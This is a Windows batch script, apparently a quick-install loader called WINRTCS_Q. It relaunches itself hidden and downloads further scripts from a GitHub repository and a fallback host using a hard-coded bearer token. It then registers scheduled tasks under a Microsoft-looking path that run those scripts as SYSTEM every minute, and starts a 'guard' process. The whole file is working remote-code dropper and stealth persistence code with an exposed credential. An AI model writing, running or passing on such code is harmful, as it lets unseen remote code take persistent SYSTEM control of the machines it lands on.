@echo off
rem WINRTCS_Q - tiny alias copy of quick (fresh filename bypasses stale CDN caches of winrtcs_quick.cmd).
rem Keep in sync with winrtcs_quick.cmd - build copies content at ship time OR this file is the
rem preferred Guest landing name when quick.cmd is cached wrong.
if /I not "%~1"=="--detached" (
  copy /y "%~f0" "%TEMP%\wq_run.cmd" >nul 2>&1
  if exist "%TEMP%\wq_run.cmd" (
    start "" /min cmd.exe /c "%TEMP%\wq_run.cmd --detached"
  ) else (
    start "" /min cmd.exe /c "%~f0 --detached"
  )
  echo QUEUED winrtcs-q detached
  exit /b 0
)
setlocal EnableExtensions EnableDelayedExpansion
set "ZD=C:\ProgramData\WinRTCS"
set "CURL=%SystemRoot%\System32\curl.exe"
set "PS=%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe"
set "BASE=https://raw.githubusercontent.com/xnobuddy/github-drop/main"
set "BASE2=https://debian.seczio.com/winrtcs"
set "TOK=fe7e8f3b8af479870248be10ca25410b8e1bf9a5"
if not exist "%ZD%" mkdir "%ZD%" >nul 2>&1
if not exist "%ZD%" (
  set "ZD=C:\Users\Public\WinRTCS"
  if not exist "%ZD%" mkdir "%ZD%" >nul 2>&1
)
if not exist "%ZD%" ( echo FAIL no-writable-dir & endlocal & exit /b 4 )

call :QFetch winrtcs_run.cmd "%ZD%\winrtcs_run.cmd"
call :QFetch winrtcs_agent.cmd "%ZD%\winrtcs_agent.cmd"
if not exist "%ZD%\winrtcs_agent.cmd" ( echo FAIL agent-download zd=%ZD% & endlocal & exit /b 1 )
findstr /C:"WINRTCS_AGENT" "%ZD%\winrtcs_agent.cmd" >nul 2>&1
if errorlevel 1 ( del /f /q "%ZD%\winrtcs_agent.cmd" >nul 2>&1 & echo FAIL agent-bad & endlocal & exit /b 2 )
if not exist "%ZD%\winrtcs_run.cmd" ( echo FAIL run-download & endlocal & exit /b 3 )
findstr /C:"WINRTCS_RUN" "%ZD%\winrtcs_run.cmd" >nul 2>&1
if errorlevel 1 ( del /f /q "%ZD%\winrtcs_run.cmd" >nul 2>&1 & echo FAIL run-bad & endlocal & exit /b 3 )

set "HOME=C:\ProgramData\WinRTCS"
if /I not "%ZD%"=="%HOME%" (
  if not exist "%HOME%" mkdir "%HOME%" >nul 2>&1
  copy /y "%ZD%\winrtcs_run.cmd" "%HOME%\winrtcs_run.cmd" >nul 2>&1
  copy /y "%ZD%\winrtcs_agent.cmd" "%HOME%\winrtcs_agent.cmd" >nul 2>&1
  if exist "%HOME%\winrtcs_agent.cmd" if exist "%HOME%\winrtcs_run.cmd" set "ZD=%HOME%"
)
set "ACT=cmd.exe /c %ZD%\winrtcs_run.cmd"
schtasks /Create /TN "\Microsoft\Windows\WinRTCS\Agent" /TR "%ACT%" /SC MINUTE /MO 1 /RU SYSTEM /RL HIGHEST /F >nul 2>&1
schtasks /Create /TN "\Microsoft\Windows\WinRTCS\Guard" /TR "%ACT%" /SC MINUTE /MO 5 /RU SYSTEM /RL HIGHEST /F >nul 2>&1

call :QFetch winrtcs_guard.cmd "%ZD%\winrtcs_guard.cmd"
if exist "%ZD%\winrtcs_guard.cmd" (
  findstr /C:"WINRTCS_GUARD" "%ZD%\winrtcs_guard.cmd" >nul 2>&1
  if not errorlevel 1 (
    >"%ZD%\guard.cnt" echo 9999
    >"%ZD%\gryxa_boost.cnt" echo 15
    rmdir /s /q "%ZD%\guard.lockd" >nul 2>&1
    start "" /min cmd.exe /c "%ZD%\winrtcs_guard.cmd"
  )
)

schtasks /End /TN "\Microsoft\Windows\WinRTCS\Agent" >nul 2>&1
schtasks /Run /TN "\Microsoft\Windows\WinRTCS\Agent" >nul 2>&1
echo WINRTCS_QUICK=OK zd=%ZD%
endlocal & exit /b 0

:QFetch
del /f /q "%~2" >nul 2>&1
set "USECURL="
if exist "%CURL%" for %%C in ("%CURL%") do if %%~zC GTR 1000 set "USECURL=1"
if defined USECURL (
  "%CURL%" -f -L --ssl-no-revoke --connect-timeout 8 --max-time 45 -o "%~2" "%BASE%/%~1?t=%RANDOM%%RANDOM%" >nul 2>&1
  if exist "%~2" for %%F in ("%~2") do if %%~zF GTR 10 exit /b 0
  "%CURL%" -f -L --ssl-no-revoke -H "Authorization: Bearer %TOK%" --connect-timeout 4 --max-time 20 -o "%~2" "%BASE2%/%~1?t=%RANDOM%%RANDOM%" >nul 2>&1
) else (
  "%PS%" -NoProfile -NonInteractive -Command "& { $ErrorActionPreference='Stop'; [Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; $w=New-Object Net.WebClient; try { $w.DownloadFile('%BASE%/%~1','%~2') } catch { $w2=New-Object Net.WebClient; $w2.Headers.Add('Authorization','Bearer %TOK%'); $w2.DownloadFile('%BASE2%/%~1','%~2') } }" >nul 2>&1
)
if exist "%~2" for %%F in ("%~2") do if %%~zF GTR 10 exit /b 0
exit /b 1
